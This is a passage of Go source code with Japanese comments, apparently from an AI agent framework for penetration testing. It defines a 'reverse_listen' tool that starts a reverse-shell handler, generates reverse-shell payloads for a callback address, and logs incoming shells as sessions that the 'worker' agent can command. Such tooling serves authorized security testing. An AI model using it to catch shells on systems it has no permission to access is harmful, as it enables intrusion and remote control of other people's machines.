				return actool.Errorf("iface が不正です（IP が必要）: " + a.Iface), nil
			}
			host, err := callbackHost()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			ri := agent.RunInfoFrom(ctx)
			if err := s.reverse.ensure(ctx, a.Port, a.Iface, ri.TaskID, ri.IntentID); err != nil {
				return actool.Errorf("handler の起動に失敗しました：" + err.Error()), nil
			}
			// ここで 1 回突合する（リバース接続が同期ループより先に届く場合がある）;失敗してもブロックしない。同期ループが補う。
			active, syncErr := s.reverse.SyncSessions(ctx)
			out := map[string]any{
				"listen_addr":    net.JoinHostPort(a.Iface, fmt.Sprint(a.Port)),
				"callback_host":  host,
				"callback_addr":  net.JoinHostPort(host, fmt.Sprint(a.Port)),
				"payloads":       reversePayloads(host, a.Port),
				"penelope_log":   s.reverse.logPath(a.Port),
				"active_reverse": active,
				"note": "ターゲットを callback_addr へリバース接続させると、新しいセッションは 10s 以内に自動で sessions 台帳（kind=reverse）へ入り、session_exec で操作できる;" +
					"iface=127.0.0.1 のときはローカル/トンネル内からのリバース接続だけが到達できる。",
			}
			if syncErr != nil {
				out["sync_warning"] = syncErr.Error()
			}
			return jsonResult(out)
		},
	})
}

// seedReverseTools は reverse_listen を tools テーブルへ seed し、既定で worker に紐づける
// （sessionTools と同じ SeedTool の初回挿入セマンティクス：既存 DB のユーザー編集は上書きしない）。
func (s *Server) seedReverseTools() {
	if s.reverse == nil {
		return
	}
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.reverseTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失敗： %v", t.Name(), err)
		}
	}
}
